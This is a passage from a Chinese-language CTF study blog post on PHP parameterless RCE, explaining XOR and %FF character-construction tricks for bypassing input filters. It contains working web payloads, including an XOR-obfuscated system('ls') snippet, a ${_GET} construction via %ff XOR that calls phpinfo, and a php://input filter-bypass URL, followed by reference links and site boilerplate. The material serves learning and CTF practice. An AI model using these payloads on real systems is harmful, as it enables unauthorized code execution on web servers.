<span class="hljs-keyword">echo</span> (<span class="hljs-string">"AYAABHAET[IF]BFHZ]]"</span>^<span class="hljs-string">"ad111a112116aa11aaabc"</span>);
<span class="hljs-comment">//没有输出，因为&lt;?php system('ls');?&gt;是代码，已经执行了，但var_dump()会显示有21个字符，或者两边都删除前两位，即可看到值</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>制作时，^左边为我们想要的php字符，右边可设置1~9/a-z/A-Z，只要得到异或出来的值即可，之后将得到的值替换原来^左边的值，再次异或，即为你想要的php字符。如上面的"&lt;“^“a”，异或后的值为]，再将原来的&lt;替换为]，”]"^"a"的结果为&lt;，所以我们绕过时，可以使用异或来得到我们想要的值</p>
<p>打CTF时，若遇到白名单过滤，但没有过滤^，可以使用该方法绕过，例如：<code>http://x.x.x.x/?page=php://input</code>，如果目标过滤:和/时这时，就可以使用<code>http://x.x.x.x/?page=php"[NN"^"aaa"input</code>，这里使用"[NN"^"aaa"异或后的值即表示被过滤的://，但需要注意的是，目标不能同时都过滤单双引号</p>
<p>但我们可以拼凑使得异或两边的都是英文字母，这样就不需要加单或双引号例：</p>
<pre><code class="hljs php"><span class="hljs-keyword">echo</span> (@AAA^@qwe);
<span class="hljs-comment">//输出06$</span></code></pre>
<p>到时候就可以也绕过单双引号，payload类<code>似http://x.x.x.x/?page=@xx^@xx</code>这样就可以了–不过这个操作没看懂（留着看日后能否碰撞出火花吧）</p>
<h2 id="73-ff的作用">7.3 %FF的作用</h2>
<p>这里先跟着佬的思路走一遍，payload：</p>
<pre><code class="hljs php">${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
<span class="hljs-comment">//${_GET}{%ff}();&amp;%ff=phpinfo</span></code></pre>
<p>看如上构造，我们接下来学习一波构造原理，这里先 上一下师傅的图片</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231020105201190.png" alt="image-20231020105201190"></p>
<p>能够接收，毕竟异或就是用不可见字符相异或表示出我们想要的字符串么，</p>
<p>然后为了传输，就进行一下url编码，便于传输和识别，</p>
<p>这里用到的关键符号就是<code>^</code>,用到的方法是利用不可见字符的异或来构造<code>_GET</code>对函数进行调用，首先是获取<code>_GET</code>的ascii码值</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231020105232167.png" alt="image-20231020105232167"></p>
<p>然后使用<code>0xff</code>分别对这几个字符进行异或操作</p>
<p>这里可能就会有疑问，为何必须用0xff来进行操作 ，而其他不行呢。</p>
<p>这里起先我也不清楚（不会思考罢了），之后看到评论区有一则回答很正解：</p>
<p>之所以用%ff是因为他用二进制表示为11111111。</p>
<p>我们知道0^1=1,1^1=1，这也就意味着我们不论传入何种字符，其转换为二进制后的数字与是上述0xff的二进制进行按位异或，最后得到的结果（也就是二进制数）一定是与原来不相同的，这时我们用得到的结果再次与0xff进行异或，得到的结果就一定是最初的字符，也就是说：</p>
<pre><code class="hljs plaintext">"A"^"0XFF"="其他",随后,  "其他"^"0xff"="A"</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231020105246550.png" alt="image-20231020105246550"></p>
<p>得到了字符串<code>0xa0b8baab</code>（均为不可见字符），将其与<code>0xffffffff</code>进行异或操作，就变成了<code>_GET</code>了，所以payload为：</p>
<pre><code class="hljs php">?_=${%ffffffff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo</code></pre>
<p>url编码也是16进制的，所以0xff与%ff是同一个意思</p>
<p>这里上一下师傅对此的解释：</p>
<pre><code class="hljs plaintext">因为url也是16进制编码的，而且a^b^b = a所以下面的这个%a0%b8%ba%ab就是0xa0xb80xba0xab,连在一起就是0xa0b8baab。16进制的a0 b8 ba ab对应的就是10进制的95 71 69 84和0xff相^出来的，， 然后，，95 71 69 84对应的也就是_ G E T
也就是_GET每个字母都和0xff或者叫%ff或者叫255相异或，变成0xa0xb80xba0xab。进行bypass。然后，再次与%ff进行异或，就变成了_GET。就达成目的了，</code></pre>
<p>总结：</p>
<p>如果我们想得到某个字符（但该字符被过滤了），那我们先令该字符与0xff进行异或，得到中间值之后，让中间值再次与0xff异或，便可以得到我们想要的某个字符</p>
<h1 id="0x08-参考文章">0x08 参考文章</h1>
<h2 id="php无参数相关">php无参数相关</h2>
<p><a target="_blank" rel="noopener" href="https://caidexin.top/2021/01/10/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/">PHP无参数RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360">PHP的无参数RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a>–p神!!!</p>
<p><a target="_blank" rel="noopener" href="https://dydong.ltd/2022/09/11/%E6%97%A0%E5%8F%82RCE/">无参RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://dydong.ltd/2022/09/11/%E6%97%A0%E5%8F%82RCE/#toc-heading-5">无参RCE</a>–递增绕过可参考，日后遇到在学习</p>
<h2 id="php异或相关">php异或相关</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/104441032?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169776726616800227480549%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169776726616800227480549&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-104441032-null-null.142%5Ev96%5Epc_search_result_base2&amp;utm_term=PHP%E5%BC%82%E6%88%96&amp;spm=1018.2226.3001.4187">PHP异或</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/115470672?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169772628416800192224232%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169772628416800192224232&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-115470672-null-null.142%5Ev96%5Epc_search_result_base2&amp;utm_term=%5B%7E%28%E5%BC%82%E6%88%96%29%5D%5B%21%25FF%5D%E7%9A%84%E5%BD%A2%E5%BC%8F%E7%BB%84%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1018.2226.3001.4187">【芝士】%ff%ff%ff%ff%ff%ff%ff || 0xff0xff0xff0xff0xff0xff0xff 异或，~ 取反过rce 自己应该是弄明白了，</a></p>
<h2 id="wp相关">wp相关</h2>
<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme">BUUCTF Web Writeup 7</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/erR0Ratao/p/14077015.html#rceme">极客大挑战2020虚空复盘</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;mid=2247485218&amp;idx=1&amp;sn=e910ddbd965ecb069b4da3d06443f337&amp;chksm=e92292a1de551bb7c48bcca06053faed2a212642ee6a2f7767f671cc553f6a2d435f99fbfae6&amp;mpshare=1&amp;scene=23&amp;srcid=1202ez9PcajE5NTRrZG6OF9G&amp;sharer_sharetime=1606872114678&amp;sharer_shareid=8752e0fdce9cf3d7a08d6c6826060293&amp;poc_token=HFM-MWWj9yElLnEEY44MDqgXVUm10XYWObWIMevW">官方wp</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/123961322">[极客大挑战 2020]Roamphp 1、2、4</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63231007/article/details/125798206?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=CTF%20%5B~(%E5%BC%82%E6%88%96)%5D%5B!%25FF%5D&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-125798206.142%5Ev96%5Epc_search_result_base2&amp;spm=1018.2226.3001.4187">buuctf刷题12(zip://包含&amp; 取反+无参数rce &amp; csrf &amp; FFI扩展安全)</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/10/22/0xgame-2023/">0xGame 2023</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/10/15/web-php-wrong-nginx-config/">Web_php_wrong_nginx_config</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%A6%82%E8%BF%B0"><span class="toc-text">0x02 概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E8%BF%87%E6%BB%A4%E5%9C%BA%E6%99%AF"><span class="toc-text">0x03 过滤场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">0x04 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-getallheaders"><span class="toc-text">4.1 getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-get_defined_vars"><span class="toc-text">4.2 get_defined_vars()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-session_id"><span class="toc-text">4.3 session_id()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-getenv"><span class="toc-text">4.4 getenv()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3"><span class="toc-text">4.5 目录操作相关</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93"><span class="toc-text">0x05 相关函数总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-phpversion"><span class="toc-text">5.1 phpversion()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-crypt"><span class="toc-text">5.2 crypt()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C"><span class="toc-text">5.3 数组操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-text">5.4 目录操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%AE%9E%E6%88%98%E6%93%8D%E4%BD%9C"><span class="toc-text">0x06 实战操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020roamphp4-rceme"><span class="toc-text">[极客大挑战 2020]Roamphp4-Rceme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82rce%E6%9E%84%E9%80%A0%E6%80%9D%E6%83%B3"><span class="toc-text">无参RCE构造思想：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php7%E4%B8%8B"><span class="toc-text">PHP7下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5%E4%B8%8B-p%E7%A5%9E%E7%9A%84%E9%A1%B6%E5%B0%96%E6%80%9D%E8%B7%AF%E6%B3%A8%E9%87%8Dp%E7%A5%9E%E7%9A%84%E6%80%9D%E8%80%83%E6%96%B9%E5%BC%8F"><span class="toc-text">PHP5下-p神的顶尖思路（注重p神的思考方式）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-ff%E4%BB%A5%E5%8F%8Axor%E7%9A%84%E6%80%9D%E8%80%83"><span class="toc-text">0x07 %FF以及XOR的思考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#71-php%E5%BC%82%E6%88%96%E6%B5%81%E7%A8%8B"><span class="toc-text">7.1 PHP异或流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#72-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99"><span class="toc-text">7.2 异或运算法则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#73-ff%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">7.3 %FF的作用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x08 参考文章</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%97%A0%E5%8F%82%E6%95%B0%E7%9B%B8%E5%85%B3"><span class="toc-text">php无参数相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%BC%82%E6%88%96%E7%9B%B8%E5%85%B3"><span class="toc-text">php异或相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp%E7%9B%B8%E5%85%B3"><span class="toc-text">wp相关</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
